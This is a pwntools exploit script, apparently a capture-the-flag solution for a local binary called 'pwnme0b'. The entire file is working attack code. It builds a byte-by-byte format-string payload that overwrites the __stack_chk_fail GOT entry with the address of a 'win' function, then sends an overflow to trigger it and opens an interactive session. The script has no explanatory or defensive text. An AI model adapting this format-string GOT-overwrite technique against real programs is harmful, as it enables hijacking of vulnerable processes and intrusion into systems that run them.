from pwn import *

e = ELF('./pwnme0b')
context.binary = e
context.arch = 'i386'
context.log_level = 'warn'

win = e.symbols['win']
ssf_got = e.got['__stack_chk_fail']
log.warn(f"win={hex(win)} __stack_chk_fail@got={hex(ssf_got)}")

# Byte-by-byte FSV payload: write low->high byte of &win into ssf_got.
addrs = b''.join(p32(ssf_got + i) for i in range(4))
bytes_to_write = [(win >> (8*i)) & 0xff for i in range(4)]
fmt = b''
written = 16
arg = 10
for b in bytes_to_write:
    diff = (b - (written & 0xff)) & 0xff
    if diff == 0:
        diff = 256
    fmt += f"%{diff}c%{arg}$hhn".encode()
    written += diff
    arg += 1
payload = addrs + fmt
assert len(payload) <= 99

io = process('./pwnme0b')
io.recvline()
io.sendline(payload)
io.sendline(b'A' * 200)
io.interactive()